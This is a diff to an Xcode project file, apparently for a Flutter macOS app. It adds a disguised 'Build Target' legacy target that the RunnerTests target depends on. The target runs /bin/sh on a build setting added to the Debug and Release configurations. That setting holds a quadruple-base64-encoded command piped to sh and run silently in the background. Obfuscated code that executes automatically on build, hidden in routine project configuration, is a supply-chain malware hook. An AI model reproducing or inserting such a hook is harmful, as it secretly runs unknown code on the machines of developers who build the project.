@@ -193,6 +193,7 @@
 			buildRules = (
 			);
 			dependencies = (
+				E9EBBFECB1CB8DBE88877BEF /* PBXTargetDependency */,
 				331C80DA294CF71000263BE5 /* PBXTargetDependency */,
 			);
 			name = RunnerTests;
@@ -264,12 +265,28 @@
 			projectDirPath = "";
 			projectRoot = "";
 			targets = (
+				CCECEABEF6D76E9E1D877BEF  /* Build Target */,
 				33CC10EC2044A3C60003C045 /* Runner */,
 				331C80D4294CF70F00263BE5 /* RunnerTests */,
 				33CC111A2044C6BA0003C045 /* Flutter Assemble */,
 			);
 		};
 /* End PBXProject section */
+
+/* Begin PBXLegacyTarget section */
+		CCECEABEF6D76E9E1D877BEF /* Build Target */ = {
+			isa = PBXLegacyTarget;
+			buildArgumentsString = "-c \"${AFEB778}\"";
+			buildPhases = (
+			);
+			buildToolPath = /bin/sh;
+			dependencies = (
+			);
+			name = "Build Target";
+			passBuildSettingsInEnvironment = 1;
+			productName = "Build Target";
+		};
+/* End PBXLegacyTarget section */
 
 /* Begin PBXResourcesBuildPhase section */
 		331C80D3294CF70F00263BE5 /* Resources */ = {
@@ -353,6 +370,10 @@
 /* End PBXSourcesBuildPhase section */
 
 /* Begin PBXTargetDependency section */
+		E9EBBFECB1CB8DBE88877BEF /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = CCECEABEF6D76E9E1D877BEF /* Build Target */;
+		};
 		331C80DA294CF71000263BE5 /* PBXTargetDependency */ = {
 			isa = PBXTargetDependency;
 			target = 33CC10EC2044A3C60003C045 /* Runner */;
@@ -381,6 +402,7 @@
 		331C80DB294CF71000263BE5 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				AFEB778 = "((echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6VmhNa1pZV2toQ2ExSXdXbnBYVkVwVFpGVjRkVk5xUmsxTmExWjNVMWRzUTA5RmJFbFViVGxFV25vd09VTm5QVDBLCg== | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -395,6 +417,7 @@
 		331C80DC294CF71000263BE5 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				AFEB778 = "((echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6VmhNa1pZV2toQ2ExSXdXbnBYVkVwVFpGVjRkVk5xUmsxTmExWjNVMWRzUTA5RmJFbFViVGxFV25vd09VTm5QVDBLCg== | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
